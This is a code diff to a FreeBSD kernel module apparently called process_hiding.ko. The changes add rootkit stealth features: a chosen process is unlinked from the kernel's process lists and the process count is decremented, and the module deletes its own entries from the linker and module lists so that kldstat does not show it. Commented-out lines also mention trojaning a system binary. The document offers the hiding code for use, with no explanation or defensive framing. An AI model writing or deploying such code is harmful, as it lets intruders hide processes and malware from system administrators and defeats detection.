@@ -1,4 +1,10 @@
 
+// p_list: Hidden
+// p_hash: Hidden
+// nprocs: Hidden
+// parents process child list: Exposed
+// parent process process-group list: Exposed
+
 
 #include <sys/types.h>
 #include <sys/param.h>
@@ -12,6 +18,33 @@
 #include <sys/sx.h>
 #include <sys/mutex.h>
 #include <sys/sysproto.h>
+
+
+// #define ORIGINAL	"/sbin/hello"
+// #define TROJAN		"/sbin/trojan_hello"
+// #define T_NAME		"trojan_hello"
+#define VERSION		"process_hiding.ko"
+
+extern linker_file_list_t linker_files;
+extern struct mtx kld_mtx;
+extern int next_file_id;
+
+typedef TAILQ_HEAD(, module) modulelist_t;
+extern modulelist_t modules;
+extern int nextid;
+struct module {
+	TAILQ_ENTRY(module)	link;    /* chain together all modules */
+	TAILQ_ENTRY(module)	flink;   /* all modules in a file */
+	struct linker_file	*file;   /* file which contains this module */
+	int									refs;    /* reference count */
+	int									id;      /* unique id number */
+	char								*name;   /* module name */
+	modeventhand_t			handler; /* event handler */
+	void								*arg;    /* argument for handler */
+	modspecific_t				data;    /* module specific data */
+};
+
+
 
 struct process_hiding_args {
 	pid_t p_pid;		/* process identifier */
@@ -40,7 +73,7 @@ process_hiding(struct thread *td, void *syscall_args)
 			/* Hide this process. */
 			LIST_REMOVE(p, p_list);
 			LIST_REMOVE(p, p_hash);
-
+			nprocs--;	//Removes from nprocs variable
 			PROC_UNLOCK(p);
 
 			break;
@@ -64,6 +97,50 @@ static int offset = NO_SYSCALL;
 static int
 load(struct module *module, int cmd, void *arg)
 {
+
+		// Hides itself from kldstat
+
+		struct linker_file *lf;
+		struct module *mod;
+
+		mtx_lock(&Giant);
+		mtx_lock(&kld_mtx);
+
+		/* Decrement the current kernel image's reference count. */
+		(&linker_files)->tqh_first->refs--;
+
+		/*
+		 * Iterate through the linker_files list, looking for VERSION.
+		 * If found, decrement next_file_id and remove from list.
+		 */
+		TAILQ_FOREACH(lf, &linker_files, link) {
+			if (strcmp(lf->filename, VERSION) == 0) {
+				next_file_id--;
+				TAILQ_REMOVE(&linker_files, lf, link);
+				break;
+			}
+		}
+
+		mtx_unlock(&kld_mtx);
+		mtx_unlock(&Giant);
+
+		sx_xlock(&modules_sx);
+
+		/*
+		 * Iterate through the modules list, looking for "incognito."
+		 * If found, decrement nextid and remove from list.
+		 */
+		TAILQ_FOREACH(mod, &modules, link) {
+			if (strcmp(mod->name, "incognito") == 0) {
+				nextid--;
+				TAILQ_REMOVE(&modules, mod, link);
+				break;
+			}
+		}
+
+		sx_xunlock(&modules_sx);
+
+
 	int error = 0;
 
 	switch (cmd) {
